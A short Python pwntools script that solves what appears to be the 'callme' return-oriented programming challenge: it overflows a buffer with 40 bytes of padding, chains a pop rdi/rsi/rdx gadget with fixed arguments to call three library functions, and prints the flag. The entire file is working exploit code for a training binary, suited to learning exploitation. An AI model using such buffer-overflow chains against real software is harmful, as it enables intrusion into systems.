#!/usr/bin/env python
from pwn import *

#definitions
e = ELF('./callme', checksec=False)

#prefix
prefix = 40*'A'

#gadget
popper = p64(0x000000000040093c) #0x000000000040093c: pop rdi; pop rsi; pop rdx; ret;

#functions
callme_one = p64(e.symbols.callme_one)
callme_two = p64(e.symbols.callme_two)
callme_three = p64(e.symbols.callme_three)

#args
arg1 = p64(0xdeadbeefdeadbeef)
arg2 = p64(0xcafebabecafebabe)
arg3 = p64(0xd00df00dd00df00d)

#bundle
bundle = popper + arg1 + arg2 +arg3

#payload
payload = prefix + bundle + callme_one
payload += bundle + callme_two
payload += bundle + callme_three

#exploit
io = process(e.path)
io.sendline(payload)
io.recvuntil("> ")
io.recvline()
io.recvline()
io.recvline()

#Flag

flag = io.recvline()
print "FLAG==> " + flag
